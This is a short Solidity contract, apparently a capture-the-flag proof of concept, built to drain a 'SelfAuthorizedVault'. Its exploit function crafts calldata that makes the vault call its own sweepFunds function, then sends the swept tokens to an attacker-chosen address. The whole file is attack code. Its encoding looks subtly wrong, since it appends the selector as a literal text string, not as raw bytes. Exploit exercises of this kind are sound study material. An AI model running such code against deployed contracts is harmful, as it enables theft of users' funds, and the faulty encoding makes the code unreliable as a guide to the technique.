// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfAuthorizedVault.sol";

contract ABI_POC {
    IERC20 public token;
    SelfAuthorizedVault public target;
    address public rec;

    constructor(IERC20 _token, SelfAuthorizedVault _target, address _rec) {
        token = _token;
        target = _target;
        rec = _rec; 
    }

    function exploit() external {
        bytes memory payload = abi.encodeWithSignature("sweepFunds(address,address)", address(this), address(token));

        if (payload.length < 64) {
            bytes memory paddedPayload = new bytes(64);
            for (uint i = 0; i < payload.length; i++) {
                paddedPayload[i] = payload[i];
            }
            payload = paddedPayload;
        }

        payload = abi.encodePacked(payload, "0xd9caed12");

        target.execute(address(target), payload);
        token.transfer(rec, token.balanceOf(address(this)));
    }

}
